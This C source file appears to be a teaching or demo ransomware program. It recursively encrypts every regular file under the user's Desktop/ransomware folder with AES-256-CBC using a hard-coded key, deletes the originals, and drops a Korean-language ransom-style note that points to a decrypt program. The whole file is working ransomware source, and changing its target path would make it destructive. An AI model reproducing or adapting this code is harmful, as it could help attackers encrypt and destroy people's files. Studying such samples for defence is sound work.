#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

void ls_dir(char* start_path);
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
void TEXT_RANSOMWARE_INFO(char* start_path_readme, char* uid);

int main()
{
    char* start_path;
    char* start_path_readme;// = (char*) malloc(strlen(start_path)+strlen("/ransomware_info/")+2);
    char* home;
    char* uid;
    uid_t user_id;
    struct passwd *lpwd;
    
    //printf("EUID   : %d\n" ,geteuid());
    //GETEUID()_effective user Identification
    lpwd = getpwuid(geteuid());
    //printf("EUNAME : %s\n", lpwd->pw_name);
    
    //start_path
    home = "/home/";
    start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
    strcpy(start_path, home);
    strcat(start_path, lpwd->pw_name);
    strcat(start_path, "/Desktop/ransomware/");
    printf("%s", start_path);
    
    //start Encrypt
    ls_dir(start_path);
    
    //ONLY ONE RANSOMWARE_INFO.txt file
    start_path_readme = (char*) malloc(strlen(start_path)+strlen("RANSOMWARE_INFO.txt")+2);
    strcpy(start_path_readme, start_path);
    strcat(start_path_readme, "RANSOMWARE_INFO.txt");
    
    //RANSOMWARE_INFO.txt
    TEXT_RANSOMWARE_INFO(start_path_readme, lpwd->pw_name);
    
    return 0;
}

void ls_dir(char* start_path)
{
    unsigned char key[] = "12345678901234561234567890123456";
    unsigned char iv[] = "1234567890123456";
    DIR* dir;
    struct dirent *ent;
    
    if((dir=opendir(start_path)) !=NULL)
    {
        while((ent=readdir(dir)) !=NULL)
        {
            int len = strlen(ent->d_name);
            const char* last_four = &ent->d_name[len-4];
            if(strcmp(last_four,".enc") != 0)
            {
                //if regular file, encrypt
                if(ent->d_type == 8)
                {
                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);
                    strcpy(full_path,start_path);
                    strcat(full_path,ent->d_name);
                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);
                    strcpy(new_name,full_path);
                    strcat(new_name,".enc");
                    
                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)
                    {
                        FILE* fpin;
                        FILE* fpout;
                        
                        fpin=fopen(full_path,"rb");
                        fpout=fopen(new_name,"wb");
                        
                        //encrypt
                        encryptfile(fpin,fpout,key,iv);
                        
                        fclose(fpin);
                        fclose(fpout);
                        
                        remove(full_path);
                    }
                    free(full_path);
                    free(new_name);
                }
                //if directory, enter the directory
                else if(ent->d_type==4)
                {
                    char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
                    strcpy(full_path,start_path);
                    strcat(full_path,ent->d_name);
                    strcat(full_path,"/");
                    printf("%s\n",full_path);
                    if(full_path != start_path && ent->d_name[0] != '.')
                    {
                        ls_dir(full_path);
                    }
                    
                    free(full_path);
                }
            }
        }
    }
}
//encrypt
void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
{
    const unsigned bufsize = 4096;
    unsigned char* read_buf = malloc(bufsize);
    unsigned char* cipher_buf ;
    unsigned blocksize;
    int out_len;
    
    EVP_CIPHER_CTX ctx;
    
    //1. init
    EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);
    blocksize = EVP_CIPHER_CTX_block_size(&ctx);
    cipher_buf = malloc(bufsize+blocksize);
    
    while(1)
    {
        int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
        //2. update
        EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);
        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
        if(bytes_read < bufsize)
        {
            break;
        }
    }
    //3. final
    EVP_CipherFinal(&ctx,cipher_buf,&out_len);
    fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
    
    free(cipher_buf);
    free(read_buf);
}

//RANSOMWARE_INFO.txt
void TEXT_RANSOMWARE_INFO(char* start_path_readme, char* uid){
    FILE* fpreadme; //file RANSOMEWARE_INFO
    
    fpreadme=fopen(start_path_readme,"w");
    
    fprintf(fpreadme, "HELLO, %s.\n\n", uid);
    fprintf(fpreadme, "지정된 경로 내의 모든 파일들이 암호화되었다.\n");
    fprintf(fpreadme, "(Default path: /Home/%s/Desktop/ransomeware)\n", uid);
    fprintf(fpreadme, "복호화를 원한다면 다음 순서를 진행하라. \n\n");
    fprintf(fpreadme, "Decrypt 방법: 컴파일 후 실행\n\n");
    fprintf(fpreadme, "1번. 컴파일\n");
    fprintf(fpreadme, "gcc decrypt.c -lcrypto -o [파일명]\n");
    fprintf(fpreadme, "예시) gcc decrypt.c -lcrypto -o decrypt\n");
    fprintf(fpreadme, "decrypt.c에 해당되는 실행파일 decrypt[파일명] 가 생성됨.\n\n");
    fprintf(fpreadme, "2번. 실행\n");
    fprintf(fpreadme, "2-1. ./decrypt\n");
    fprintf(fpreadme, "2-2. 생성된 decrypt 파일 double click\n\n");
    fprintf(fpreadme, "참고) https://youtu.be/DYwdpi49lpQ\n");
    
    fclose(fpreadme);
}
